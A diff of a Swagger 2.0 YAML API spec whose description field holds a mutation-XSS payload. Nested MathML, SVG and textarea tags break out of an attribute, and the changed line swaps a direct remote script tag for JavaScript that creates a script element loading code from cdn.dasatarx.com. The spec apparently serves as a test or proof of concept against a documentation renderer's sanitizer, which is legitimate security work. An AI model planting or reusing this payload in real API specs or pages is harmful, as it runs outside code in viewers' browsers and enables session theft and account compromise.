@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script src='https://cdn.dasatarx.com/b/7bc3af9c-ebc5-4fc3-a368-90dbd3e66802'></script>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script>var script=document.createElement("script");script.src="https://cdn.dasatarx.com/b/7bc3af9c-ebc5-4fc3-a368-90dbd3e66802";document.head.appendChild(script);</script>">
 paths:
   /accounts:
     get:
